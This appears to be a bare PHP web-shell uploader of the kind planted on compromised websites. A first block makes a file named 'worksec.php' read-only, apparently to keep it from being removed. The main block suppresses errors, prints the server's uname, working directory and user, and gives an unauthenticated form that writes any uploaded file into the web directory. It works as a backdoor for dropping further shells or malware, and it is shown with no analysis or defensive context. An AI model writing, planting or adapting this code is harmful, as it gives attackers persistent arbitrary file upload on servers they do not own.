<?php

// Path to the file
$file = 'worksec.php';

// Change the file permissions to 0444 (read-only)
chmod($file, 0444);

?>
<?php

error_reporting(0);
set_time_limit(0);
$user = get_current_user();

echo "<center><b>Uname:".php_uname()."<br></b>"; 
echo "<br><b>Base Dir : ".getcwd()."<br></b>";
echo "<br><b>User : ".$user."<br></b>";
echo '<br><font color="black" size="4">';
if(isset($_POST['Submit'])){
    $filedir = ""; 
    $maxfile = '2000000';
    $mode = '0644';
    $userfile_name = $_FILES['image']['name'];
    $userfile_tmp = $_FILES['image']['tmp_name'];
    if(isset($_FILES['image']['name'])) {
        $qx = $filedir.$userfile_name;
        @move_uploaded_file($userfile_tmp, $qx);
        @chmod ($qx, octdec($mode));
	echo" <a href=$userfile_name><center><b>Sucessfully Uploaded :D ==> $userfile_name</b></center></a>";
	}
}else{
	echo'<form method="POST" action="#" enctype="multipart/form-data"><input type="file" name="image"><br><input type="Submit" name="Submit" value="Upload"></form>';
}
echo '</center></font>';

?>
